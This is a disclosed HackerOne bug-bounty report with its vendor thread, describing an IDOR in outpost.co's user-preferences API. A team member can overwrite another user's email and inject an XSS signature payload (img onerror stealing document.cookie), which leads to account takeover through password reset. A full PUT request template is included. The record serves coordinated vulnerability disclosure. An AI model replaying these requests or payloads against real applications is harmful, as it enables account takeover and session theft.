{"id":854290,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTQyOTA=","url":"https://hackerone.com/reports/854290","title":"IDOR on update user preferences","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-04-20T14:37:10.118Z","submitted_at":"2020-04-20T14:37:10.118Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"macasun","url":"/macasun","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":42327,"url":"https://hackerone.com/palo_alto_software","handle":"palo_alto_software","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/042/327/6b83191758494b9c630b6ba94f088d0c78829602_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/327/6b83191758494b9c630b6ba94f088d0c78829602_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Palo Alto Software","twitter_handle":"","website":"https://paloalto.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-05-13T19:52:07.215Z","bug_reporter_agreed_on_going_public_at":"2020-05-13T13:13:39.249Z","team_member_agreed_on_going_public_at":"2020-05-13T19:52:07.147Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nTeam member with role USER can change data of any user in the team, or steal his cookies, or steal the account of victim via forget password function.\n\n## Steps To Reproduce:\n\n  1. Login in as user1 (the user with role `admin`) and invite user2 (set his role to `user`).\n  2. Login in as user2, open Mail tab and select user1 from `Conversation assignment` dropdown (see F796149 attachment).\n  3. Open network tools in the browser devTools or open local proxy and copy `UserUuid` (`da4f313f-e21e-4b5f-b2da-42d9864716f6` in my case) of the user1 from the following request: https://api.outpost.co/api/v1/conversation/assigned?assignedToUserUuid=da4f313f-e21e-4b5f-b2da-42d9864716f6.\n  4. Use template `request1` to create http request. Change `{user1-uuid}` to user1 Uuid, `{user2-cookie}` to user2 cookie. In the request body: `{attacker-email}` to email controlled by user2, `signature` to the following: `\u003cp style=\\\"margin:0;\\\"\u003eUser Signature2\u003cimg src=x onerror=alert(document.cookie) \u003e\u003c/p\u003e`. Send request.\n  5. Login in as user1. Open https://app.outpost.co/settings/preferences, alert with user1 cookie will appear (see F796148 attachment).\n  6. Open https://app.outpost.co/sign-in/help and paste `{attacker-email}`. Open email client, click the link to restore password, enter a new password. Now you can login in using user1 email address and password entered on the previos step.\n\n## Supporting Material/References:\n\n- request1 template:\n\n```\nPUT /api/v1/user/preferences/{user1-uuid} HTTP/2.0\nHost: api.outpost.co\nContent-Length: 434\nSec-Fetch-Dest: empty\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36\nDnt: 1\nContent-Type: application/json\nAccept: */*\nOrigin: https://app.outpost.co\nSec-Fetch-Site: same-site\nSec-Fetch-Mode: cors\nReferer: https://app.outpost.co/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7\nCookie: auth={user2-cookie}\n\n{\n  \"firstName\": \"user1-changed-by-user2\",\n  \"lastName\": \"null\",\n  \"email\": \"{attacker-email}\",\n  \"role\": \"USER\",\n  \"defaultMailboxUuid\": \"\",\n  \"mailboxUuids\": [\n    \"e4a63ae3-bb10-46f8-be28-a2660a2344ec\"\n  ],\n  \"signature\": \"{signature}\",\n  \"timezone\": \"Europe/Moscow\",\n  \"defaultSendAndResolve\": false,\n  \"selectFirstConversation\": true\n}\n```\n\n## Impact\n\nAn attacker can change data of any user in the team, or steal his cookies, or steal account of victim via forget password function.","weakness":{"id":55,"name":"Insecure Direct Object Reference (IDOR)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":796148,"file_name":"s2.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Y3B2MPEgJGngTmZzjwkacAiU?response-content-disposition=attachment%3B%20filename%3D%22s2.jpg%22%3B%20filename%2A%3DUTF-8%27%27s2.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTXACUYF6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153444Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDZ4o5FgQbPOV7cUhasXsMpsRhfie%2BaT3j2%2FpT4vRtXrQIhANTpo%2FcLyZWkchHfmQUF52JZTNkTQv76yqIpKiufRkzIKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBFvChFQcfy0iFfX8q1wNyqcNfKQ7lbPM93GK7zsCVuFEl%2FVm4iCcIyQUbJFWfH2jiZwLWzXyXOGtPdAFg6jZ27A3JiIMI2cRQ0ZjefpX23ew4f2EgNrAjI%2BtoD%2F5QRlfpZWkH6iJZQB6Tl2elKHpLsozAmLMg2ZCF27az6tPlE5SwA3JPC5KKlDjsViNs2UljZCi3H9uSwsukoU%2FvdCWTH%2Fn50kTwo3bwe%2FH3PWsruJkAQ7DX1%2Fj9brsxUqDkLoqtLrdoJjkKc0QIPiVbiif2roLjf%2B%2BMNUUjLjPZ27VJBWMgYN3p%2FXN%2Fc2BT1VqWpZMMYQ84FXmc9pAGYMt40reW%2BOqOJwy98WVa3ZnRts3MNHsi7yiH6arhodeoIERCyyc0BhhJEItkxN5Wzyg1DrlhRUS1Y71%2FbjrEz4uBhQSkdwrt3ERf6rlWOARG2SfQdqloTHaxYeaKlkA1gYk2lr8P8v4Z2wcf76dl0kv5neqxZuEP1QXm7QMG6m4bxy4%2BSeNKsdU%2FVA5yixjEwa92C8A1VyBQrxcJgjfs7VfF2qV2iBmnh%2FB2iQg07zl1YJd0cPNun9USqJb8Uqe%2B27IwrOZbWtmOWnBh1TcvDRMDsM%2FPcb7c4FlLVjUX8TDrhUH4Hz0mpfpQPYswtoqRiwY6pAGpulV8rT1rLL2zo7CLXj%2FCsA9YXTe8QLCuwj5BAVEq1XkBbMgCpFE7wCWHjGb7zRvhVV%2BN69FRCvvxudtZT7OkdQfTd7cCnr7vVLgwdFxyTBTiSFdPhCB%2F%2BGa%2FZGSO8Tzmn%2F5kYwNrvNcaCO%2FfxLRKT5QyWFtCeJZaDCV4pXJgLvMY0o61KPcMitqxyN7tABkO5sZ5lEaE04FUiiZgi%2BMqeSxyhg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c4465c2ab704a3d9a7622501830b216415fe8ca4e949dfc3b109c3f521b576fb","file_size":313887,"type":"image/jpeg"},{"id":796149,"file_name":"s1.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/TGpp6b4w7tYTrJjYfZADNLWJ?response-content-disposition=attachment%3B%20filename%3D%22s1.jpg%22%3B%20filename%2A%3DUTF-8%27%27s1.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTXACUYF6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153444Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDZ4o5FgQbPOV7cUhasXsMpsRhfie%2BaT3j2%2FpT4vRtXrQIhANTpo%2FcLyZWkchHfmQUF52JZTNkTQv76yqIpKiufRkzIKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBFvChFQcfy0iFfX8q1wNyqcNfKQ7lbPM93GK7zsCVuFEl%2FVm4iCcIyQUbJFWfH2jiZwLWzXyXOGtPdAFg6jZ27A3JiIMI2cRQ0ZjefpX23ew4f2EgNrAjI%2BtoD%2F5QRlfpZWkH6iJZQB6Tl2elKHpLsozAmLMg2ZCF27az6tPlE5SwA3JPC5KKlDjsViNs2UljZCi3H9uSwsukoU%2FvdCWTH%2Fn50kTwo3bwe%2FH3PWsruJkAQ7DX1%2Fj9brsxUqDkLoqtLrdoJjkKc0QIPiVbiif2roLjf%2B%2BMNUUjLjPZ27VJBWMgYN3p%2FXN%2Fc2BT1VqWpZMMYQ84FXmc9pAGYMt40reW%2BOqOJwy98WVa3ZnRts3MNHsi7yiH6arhodeoIERCyyc0BhhJEItkxN5Wzyg1DrlhRUS1Y71%2FbjrEz4uBhQSkdwrt3ERf6rlWOARG2SfQdqloTHaxYeaKlkA1gYk2lr8P8v4Z2wcf76dl0kv5neqxZuEP1QXm7QMG6m4bxy4%2BSeNKsdU%2FVA5yixjEwa92C8A1VyBQrxcJgjfs7VfF2qV2iBmnh%2FB2iQg07zl1YJd0cPNun9USqJb8Uqe%2B27IwrOZbWtmOWnBh1TcvDRMDsM%2FPcb7c4FlLVjUX8TDrhUH4Hz0mpfpQPYswtoqRiwY6pAGpulV8rT1rLL2zo7CLXj%2FCsA9YXTe8QLCuwj5BAVEq1XkBbMgCpFE7wCWHjGb7zRvhVV%2BN69FRCvvxudtZT7OkdQfTd7cCnr7vVLgwdFxyTBTiSFdPhCB%2F%2BGa%2FZGSO8Tzmn%2F5kYwNrvNcaCO%2FfxLRKT5QyWFtCeJZaDCV4pXJgLvMY0o61KPcMitqxyN7tABkO5sZ5lEaE04FUiiZgi%2BMqeSxyhg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=fdff17d9fe9bf8a9b6d30d558118fe85593a668b06f13ab0c2e331475f60c36e","file_size":412260,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2020-06-12T13:13:39.310Z","allow_singular_disclosure_after":-41998865.36995463,"singular_disclosure_allowed":true,"vote_count":9,"voters":["brahim_boufakri01","mik317","ali","sachin_kumar_","klau5","themagicnacho","r4sk0ln1k0v","rashedul_css","ravana_26"],"severity":{"rating":"critical","score":10.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"low","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":35341,"asset_type":"URL","asset_identifier":"app.outpost.co","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7729652,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@alexandermac05, thanks for the report! Can you clarify steps 5 and 6?\n\nIn step 5, were you able to harvest user1's cookie and make authenticated requests with it?\n\nIn step 6, are you saying that if you are already logged in as user1, and enter user2's email in the forgot password form, that user2 will get an email to reset user1's password?\n\nThanks again for hacking on our systems.","automated_response":false,"created_at":"2020-04-20T19:40:40.009Z","updated_at":"2020-04-20T19:40:40.009Z","actor":{"username":"kad3nce","cleared":false,"url":"/kad3nce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7729917,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@kad3nce thanks for the response.\n\n\u003e In step 5, were you able to harvest user1's cookie and make authenticated requests with it?\n\nNo, this is impossible. Your app stores `auth` cookie on the different domain - `.appcues.com`, so this is impossible to get them using provided XSS, but I guess this possible with another technique, maybe injected iFrame. \n\n\u003e In step 6, are you saying that if you are already logged in as user1, and enter user2's email in the forgot password form, that user2 will get an email to reset user1's password?\n\nSorry, for inaccurate explanation, in steps 4 and 6 you should use email address that is controlled by user2, but that is **not** email used for registration on outpost.co. For example, if he used user2@mail.com for registration, on steps 4 and 6 he can use user2222@mail.com.\n\nBest regards,\nAlex.","automated_response":false,"created_at":"2020-04-20T20:05:20.300Z","updated_at":"2020-04-20T20:05:20.300Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7731863,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the follow-up, @alexandermac05. This is the first report of the privilege escalation issue in the API. We do have another report of the XSS vulnerability in the signature editor. We'll get a fix in the queue for the priv escalation and will report back once it's resolved.\n\nThanks again!","automated_response":false,"created_at":"2020-04-20T23:58:29.281Z","updated_at":"2020-04-20T23:58:29.281Z","actor":{"username":"kad3nce","cleared":false,"url":"/kad3nce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7733818,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@kad3nce ok, thanks for the update.","automated_response":false,"created_at":"2020-04-21T07:11:57.708Z","updated_at":"2020-04-21T07:11:57.708Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7968168,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@macasun, the fix for this has been deployed. Have a good one!","automated_response":false,"created_at":"2020-05-11T22:07:14.550Z","updated_at":"2020-05-11T22:07:14.550Z","actor":{"username":"kad3nce","cleared":false,"url":"/kad3nce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"macasun","url":"/macasun"},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7989044,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@kad3nce thanks for the good feedback. I confirm that issue is fixed, do you agree to disclosure the report?","automated_response":false,"created_at":"2020-05-13T13:13:33.036Z","updated_at":"2020-05-13T13:13:33.036Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7989047,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-05-13T13:13:39.280Z","updated_at":"2020-05-13T13:13:39.280Z","first_to_agree":true,"actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7993210,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-05-13T19:52:07.168Z","updated_at":"2020-05-13T19:52:07.168Z","actor":{"username":"kad3nce","cleared":false,"url":"/kad3nce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7993211,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-05-13T19:52:07.238Z","updated_at":"2020-05-13T19:52:07.238Z","actor":{"username":"kad3nce","cleared":false,"url":"/kad3nce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}